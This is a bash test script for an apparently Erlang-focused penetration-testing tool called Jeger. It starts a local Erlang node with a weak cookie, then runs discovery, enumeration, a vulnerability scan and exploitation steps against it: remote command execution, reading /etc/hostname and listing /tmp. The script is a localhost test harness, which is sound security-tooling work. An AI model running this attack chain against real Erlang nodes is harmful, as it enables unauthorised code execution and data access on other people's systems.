#!/bin/bash
# Jeger Attack Chain Testing Script
# This script automates testing the full penetration testing workflow

set -e

echo "========================================"
echo "  JEGER ATTACK CHAIN TEST"
echo "========================================"
echo ""

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Step 1: Check if EPMD is running
echo -e "${YELLOW}[1/6] Checking EPMD status...${NC}"
if epmd -names > /dev/null 2>&1; then
    echo -e "${GREEN}✓ EPMD is running${NC}"
    epmd -names
else
    echo -e "${RED}✗ EPMD not running. Starting EPMD...${NC}"
    epmd -daemon
    sleep 1
fi
echo ""

# Step 2: Start vulnerable test node in background
echo -e "${YELLOW}[2/6] Starting vulnerable test node...${NC}"
echo "Starting: erl -sname testnode -setcookie testsecret"

# Kill any existing testnode
pkill -f "sname testnode" 2>/dev/null || true
sleep 1

# Start test node in background
erl -sname testnode -setcookie testsecret -noshell -detached

# Wait for node to register
sleep 3

# Verify node is registered
if epmd -names | grep -q testnode; then
    echo -e "${GREEN}✓ Test node started and registered${NC}"
    epmd -names | grep testnode
else
    echo -e "${RED}✗ Failed to start test node${NC}"
    exit 1
fi
echo ""

# Step 3: Discovery
echo -e "${YELLOW}[3/6] Running Discovery Scan...${NC}"
cat > /tmp/jeger_test_discovery.erl <<'EOF'
#!/usr/bin/env escript

main(_) ->
    code:add_pathz("_build/default/lib/jeger/ebin"),

    io:format("Scanning 127.0.0.1 for EPMD services...~n"),
    {ok, Hosts} = jeger_discovery:discover({"127.0.0.", 1, 1}),

    io:format("~nDiscovery Results:~n"),
    io:format("~p~n~n", [Hosts]),

    case Hosts of
        [#{nodes := Nodes}] when length(Nodes) > 0 ->
            io:format("✓ SUCCESS: Found ~p node(s)~n", [length(Nodes)]),
            [io:format("  - ~s (port ~p)~n", [maps:get(name, N), maps:get(port, N)]) || N <- Nodes],
            halt(0);
        _ ->
            io:format("✗ FAILED: No nodes discovered~n"),
            halt(1)
    end.
EOF

chmod +x /tmp/jeger_test_discovery.erl
escript /tmp/jeger_test_discovery.erl || {
    echo -e "${RED}Discovery failed${NC}"
    pkill -f "sname testnode"
    exit 1
}
echo ""

# Step 4: Enumeration
echo -e "${YELLOW}[4/6] Running Enumeration...${NC}"
cat > /tmp/jeger_test_enum.erl <<'EOF'
#!/usr/bin/env escript

main(_) ->
    code:add_pathz("_build/default/lib/jeger/ebin"),

    {ok, FullHostname} = inet:gethostname(),
    % Remove domain suffix to get short name for -sname
    Host = hd(string:split(FullHostname, ".")),
    io:format("Attempting to enumerate testnode@~s...~n", [Host]),
    NodeName = "testnode",
    Cookie = testsecret,

    case jeger_enum:enumerate_node(Host, NodeName, Cookie) of
        {ok, Info} ->
            io:format("~n✓ SUCCESS: Enumeration complete~n"),
            FormattedEnum = lists:flatten(jeger_enum:format_enumeration(Info)),
            io:format("~s~n", [FormattedEnum]),
            halt(0);
        {error, Reason} ->
            io:format("~n✗ FAILED: ~p~n", [Reason]),
            halt(1)
    end.
EOF

chmod +x /tmp/jeger_test_enum.erl
escript /tmp/jeger_test_enum.erl || {
    echo -e "${RED}Enumeration failed${NC}"
    pkill -f "sname testnode"
    exit 1
}
echo ""

# Step 5: Vulnerability Scanning
echo -e "${YELLOW}[5/6] Running Vulnerability Scan...${NC}"
cat > /tmp/jeger_test_scan.erl <<'EOF'
#!/usr/bin/env escript

main(_) ->
    code:add_pathz("_build/default/lib/jeger/ebin"),

    {ok, FullHostname} = inet:gethostname(),
    Host = hd(string:split(FullHostname, ".")),
    io:format("Scanning testnode@~s for vulnerabilities...~n", [Host]),
    NodeName = "testnode",
    Cookie = testsecret,

    case jeger_scan:scan_node(Host, NodeName, Cookie) of
        {ok, Findings} ->
            io:format("~n✓ SUCCESS: Vulnerability scan complete~n"),
            FormattedScan = lists:flatten(jeger_scan:format_findings(Findings)),
            io:format("~s~n", [FormattedScan]),
            halt(0);
        {error, Reason} ->
            io:format("~n✗ FAILED: ~p~n", [Reason]),
            halt(1)
    end.
EOF

chmod +x /tmp/jeger_test_scan.erl
escript /tmp/jeger_test_scan.erl || {
    echo -e "${RED}Vulnerability scan failed${NC}"
    pkill -f "sname testnode"
    exit 1
}
echo ""

# Step 6: Exploitation
echo -e "${YELLOW}[6/6] Running Exploitation Tests...${NC}"
cat > /tmp/jeger_test_exploit.erl <<'EOF'
#!/usr/bin/env escript

main(_) ->
    code:add_pathz("_build/default/lib/jeger/ebin"),

    {ok, FullHostname} = inet:gethostname(),
    Host = hd(string:split(FullHostname, ".")),
    NodeName = "testnode",
    Cookie = testsecret,

    io:format("~n--- Test 1: Execute Command ---~n"),
    case jeger_exploit:execute_command(Host, NodeName, Cookie, "erlang:node().") of
        {ok, Result} ->
            io:format("✓ Command execution successful~n"),
            io:format("Result: ~p~n", [Result]);
        {error, E1} ->
            io:format("✗ Failed: ~p~n", [E1])
    end,

    io:format("~n--- Test 2: Read File ---~n"),
    case jeger_exploit:read_file(Host, NodeName, Cookie, "/etc/hostname") of
        {ok, Content} ->
            io:format("✓ File read successful~n"),
            io:format("Hostname: ~s~n", [Content]);
        {error, E2} ->
            io:format("✗ Failed: ~p~n", [E2])
    end,

    io:format("~n--- Test 3: List Directory ---~n"),
    case jeger_exploit:list_directory(Host, NodeName, Cookie, "/tmp") of
        {ok, Files} ->
            io:format("✓ Directory listing successful~n"),
            io:format("Found ~p files in /tmp~n", [length(Files)]);
        {error, E3} ->
            io:format("✗ Failed: ~p~n", [E3])
    end,

    io:format("~n✓ Exploitation tests complete~n"),
    halt(0).
EOF

chmod +x /tmp/jeger_test_exploit.erl
escript /tmp/jeger_test_exploit.erl || {
    echo -e "${RED}Exploitation failed${NC}"
    pkill -f "sname testnode"
    exit 1
}
echo ""

# Cleanup
echo -e "${YELLOW}Cleaning up...${NC}"
pkill -f "sname testnode" 2>/dev/null || true
rm -f /tmp/jeger_test_*.erl

echo ""
echo "========================================"
echo -e "${GREEN}  ALL TESTS COMPLETED SUCCESSFULLY!${NC}"
echo "========================================"
echo ""
echo "Summary:"
echo "  ✓ Discovery: Found test node"
echo "  ✓ Enumeration: Gathered system info"
echo "  ✓ Vulnerability Scan: Identified weak cookie"
echo "  ✓ Exploitation: Executed commands, read files, listed directories"
echo ""